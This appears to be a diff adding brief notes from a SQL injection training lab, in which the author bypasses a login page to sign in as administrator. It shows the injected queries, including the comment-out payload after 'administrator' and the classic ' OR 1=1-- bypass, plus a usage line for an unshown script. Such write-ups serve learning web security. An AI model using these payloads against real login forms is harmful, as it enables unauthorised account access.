@@ -1,0 +1,28 @@
+SQL injection - Login page
+
+Goals:
+1- perform SQLi attack and log in as an administrator
+
+Analysis:
+
+SELECT * FROM users WHERE username='admin' AND password='admin'
+
+SELECT * FROM users WHERE username = ''' AND password = 'admin'
+
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'admin'
+--
+SELECT * FROM users WHERE username = 'administrator'--' AND password = 'admin'
+
+OR
+
+SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'admin'
+--
+
+Solved
+
+
+Creating the script for the lab
+
+script.py <url> <sql-payload>
+
+
